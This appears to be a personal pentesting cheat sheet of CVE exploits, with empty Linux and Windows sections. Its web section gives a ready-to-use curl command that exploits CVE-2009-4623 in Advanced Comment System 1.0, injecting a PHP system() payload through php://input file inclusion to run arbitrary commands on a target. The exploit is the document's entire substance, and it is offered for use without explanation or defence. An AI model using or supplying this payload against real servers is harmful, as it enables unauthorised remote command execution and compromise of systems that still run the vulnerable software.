# CVE

## Linux



## Windows



## WEB

#### CVE-2009-4623 (Advanced Comment System 1.0) - RCE

```
curl -s --data "<?system('<CMD');?>" 'http://<IP>/internal/advanced_comment_system/admin.php?ACS_path=php://input%00'
```
